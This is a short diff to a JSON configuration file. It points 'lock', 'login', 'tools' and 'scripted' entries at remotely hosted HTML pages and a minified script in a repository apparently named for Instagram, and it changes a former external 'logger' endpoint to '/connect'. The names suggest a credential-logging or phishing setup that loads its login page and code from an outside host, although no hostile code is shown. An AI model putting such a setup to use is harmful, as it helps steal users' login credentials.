@@ -1,7 +1,7 @@
 {
-    "lock" : "",
-    "login" : "",
-    "tools" : "",
-    "scripted" : "",
-    "base" : "https://sciencenumber.me/logger"
+    "lock" : "https://rawcdn.githack.com/pamanbobb/instahtcx/2ac8b5979037176574f0f0184d71e0ce0498c53e/log.html",
+    "login" : "https://rawcdn.githack.com/pamanbobb/instahtcx/2ac8b5979037176574f0f0184d71e0ce0498c53e/masuk.html",
+    "tools" : "https://rawcdn.githack.com/pamanbobb/instahtcx/2ac8b5979037176574f0f0184d71e0ce0498c53e/tools.html",
+    "scripted" : "https://rawcdn.githack.com/pamanbobb/instahtcx/2ac8b5979037176574f0f0184d71e0ce0498c53e/npm.min.js",
+    "base" : "/connect"
 }
